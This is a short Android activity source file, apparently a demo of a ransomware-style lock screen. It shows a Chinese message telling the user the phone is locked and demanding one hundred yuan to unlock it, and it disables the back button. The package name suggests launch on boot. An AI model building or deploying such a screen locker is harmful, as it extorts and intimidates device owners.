package com.zcm.it.bootcompletereceiver;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {
    TextView tv;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tv = (TextView) findViewById(R.id.tv);
        tv.setText("你的手机已被锁定，支付一百块就可以帮你解锁！");
    }

    @Override
    public void onBackPressed() {
//        super.onBackPressed();
    }
}
